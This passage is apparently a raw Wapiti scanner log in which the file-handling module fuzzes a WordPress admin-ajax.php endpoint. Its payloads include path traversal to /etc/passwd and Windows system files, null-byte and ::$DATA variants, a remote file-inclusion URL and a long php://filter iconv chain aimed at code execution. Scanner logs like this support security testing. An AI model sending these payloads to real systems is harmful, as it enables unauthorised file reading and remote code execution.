convert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp&action=sac_post_type_call (0)
2024-03-21 21:16:14.175 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:14.790 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:15.402 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:16.014 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:16.626 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:17.240 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:17.851 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:18.461 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:19.073 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:19.682 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:20.293 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:20.902 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:21.514 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:22.122 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:22.734 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:23.344 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:23.963 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:24.575 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:25.187 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:25.799 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:26.409 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:27.020 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:27.630 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:28.241 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:28.853 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=file%3A%2F%2F%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:29.465 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices&action=sac_post_type_call (0)
2024-03-21 21:16:30.076 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd&action=sac_post_type_call (0)
2024-03-21 21:16:30.686 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00&action=sac_post_type_call (0)
2024-03-21 21:16:31.298 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:31.910 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:32.521 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices&action=sac_post_type_call (0)
2024-03-21 21:16:33.133 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00&action=sac_post_type_call (0)
2024-03-21 21:16:33.745 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=admin-ajax.php&action=sac_post_type_call (0)
2024-03-21 21:16:34.355 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=admin-ajax.php%00&action=sac_post_type_call (0)
2024-03-21 21:16:34.964 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=admin-ajax.php%3A%3A%24DATA&action=sac_post_type_call (0)
2024-03-21 21:16:35.576 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
2024-03-21 21:16:36.183 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
2024-03-21 21:16:36.792 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%2Fetc%2Fpasswd (0)
2024-03-21 21:16:37.405 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:16:38.064 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%2Fetc%2Fservices (0)
2024-03-21 21:16:38.724 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:39.375 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
2024-03-21 21:16:40.004 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
2024-03-21 21:16:40.615 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
2024-03-21 21:16:41.254 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:16:41.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:42.550 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
2024-03-21 21:16:43.160 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
2024-03-21 21:16:43.814 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
2024-03-21 21:16:44.457 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:16:45.101 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:16:45.741 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:16:46.351 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:16:46.968 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:16:47.622 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:16:48.271 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:48.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:49.537 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:16:50.145 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:16:50.804 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:51.459 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:52.129 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
2024-03-21 21:16:52.789 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:16:53.445 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
2024-03-21 21:16:54.056 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:16:54.714 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
2024-03-21 21:16:55.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:16:56.024 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
2024-03-21 21:16:56.680 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:57.339 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
2024-03-21 21:16:57.992 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:16:58.602 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
2024-03-21 21:16:59.262 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/wp-admin/admin-ajax.php?post_type=fuzz&action=sac_post_type_call%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
